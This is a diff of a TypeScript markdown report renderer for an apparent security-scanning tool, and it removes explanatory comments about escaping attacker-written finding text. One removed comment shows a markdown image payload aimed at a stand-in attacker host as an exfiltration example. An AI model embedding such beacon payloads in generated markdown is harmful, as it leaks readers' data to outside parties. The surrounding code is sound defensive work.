@@ -1,12 +1,3 @@
-/**
- * Report rendering. No LLM — SQLite in, markdown out (plan §1).
- *
- * Outputs are attack surfaces, because every finding carries attacker-authored
- * prose (plan §8). Prose is stripped of control characters at the write
- * boundary; here it is additionally kept out of any position where markdown
- * would execute it.
- */
-
 import type { Candidate, Coverage, ScanRecord } from "../types.js";
 import { formatSeverity, renderMatrix, severityRank } from "./severity.js";
 
@@ -21,13 +12,7 @@ export interface ReportInput {
 	excludedFiles: number;
 	modelRef: string;
 	promptHash: string;
-	/** How ownership was split. One probe owning most of a repo is a weaker claim. */
 	partitions?: string;
-	/**
-	 * Where the threat model came from. A scan run against a threat model the
-	 * user edited is a different claim from one that wrote its own, and the
-	 * reader of the report cannot tell unless it says so.
-	 */
 	threatModel?: string;
 }
 
@@ -63,7 +48,6 @@ export function renderMarkdown(r: ReportInput): string {
 	out.push(`| cost | ${r.scan.cost_usd > 0 ? `$${r.scan.cost_usd.toFixed(4)}` : "_not priced_"} |`);
 	out.push("");
 
-	// --- coverage -----------------------------------------------------------
 	const pctFiles = pct(r.coverage.files_touched, r.coverage.files_in_scope);
 	const pctBytes = pct(r.coverage.bytes_read, r.coverage.bytes_in_scope);
 	out.push("## Coverage", "");
@@ -82,7 +66,6 @@ export function renderMarkdown(r: ReportInput): string {
 		out.push(`Extensions in scope: ${r.languages.map((l) => `\`.${esc(l)}\``).join(", ")}.`, "");
 	}
 
-	// --- findings -----------------------------------------------------------
 	out.push("## Findings", "");
 	if (confirmed.length === 0) {
 		out.push("_No confirmed findings._", "");
@@ -105,7 +88,6 @@ export function renderMarkdown(r: ReportInput): string {
 		for (const c of confirmed) out.push(...renderFinding(c));
 	}
 
-	// --- everything else ----------------------------------------------------
 	if (followUp.length > 0) {
 		out.push("## Needs follow-up", "");
 		out.push(
@@ -226,10 +208,6 @@ function renderFinding(c: Candidate): string[] {
 	out.push("**What an attacker gets**", "", esc(c.summary), "");
 	out.push("**Evidence**", "", quote(c.evidence), "");
 
-	// Both passes, separately attributed. A reader who disagrees with the rating
-	// should be able to see whether the disagreement is about whether the bug is
-	// real or about how far it reaches — they are different arguments, made by
-	// different agents, and collapsing them into one paragraph hides which.
 	if (c.resolution?.validation) {
 		out.push("**Validation**", "", esc(c.resolution.validation.rationale), "");
 	}
@@ -251,9 +229,6 @@ function renderFinding(c: Candidate): string[] {
 	}
 
 	if (inputs) {
-		// Every input, including the two that promote a finding to critical.
-		// Printing the conclusion while hiding what caused it is the one thing a
-		// report whose pitch is "a severity you can defend" cannot do.
 		out.push("**Severity inputs**", "");
 		out.push(
 			`\`impact=${inputs.impact}\` \`vector=${inputs.vector}\` \`auth_required=${inputs.auth_required}\` ` +
@@ -275,16 +250,6 @@ function firstLoc(c: Candidate): string {
 	return l ? `${esc(l.path)}:${l.start_line}` : "?";
 }
 
-/**
- * Neutralize markdown/HTML that arrived as finding prose. Control characters
- * and secret-shaped strings were already handled at the write boundary; this
- * stops a title from opening a tag, breaking out of a table cell, or turning
- * into an image that fires a request when the report is opened.
- *
- * `!` and `[` matter more than they look: `![x](https://attacker/?leak)` in a
- * finding title renders as an image in every markdown viewer, which is a
- * read-receipt on a security report.
- */
 function esc(s: string): string {
 	return String(s)
 		.replaceAll("<", "&lt;")
@@ -295,17 +260,10 @@ function esc(s: string): string {
 		.replaceAll("!", "\\!");
 }
 
-/**
- * For anywhere the text must stay on one line — table cells, headings, list
- * items. A newline in a title otherwise terminates the row and the remainder
- * is emitted as document-level markdown, which lets a finding forge sections
- * and severities.
- */
 function escInline(s: string): string {
 	return esc(String(s).replace(/[\r\n]+/g, " ")).trim();
 }
 
-/** Evidence is quoted, never fenced — a fence in the payload would close ours. */
 function quote(s: string): string {
 	return String(s)
 		.split("\n")
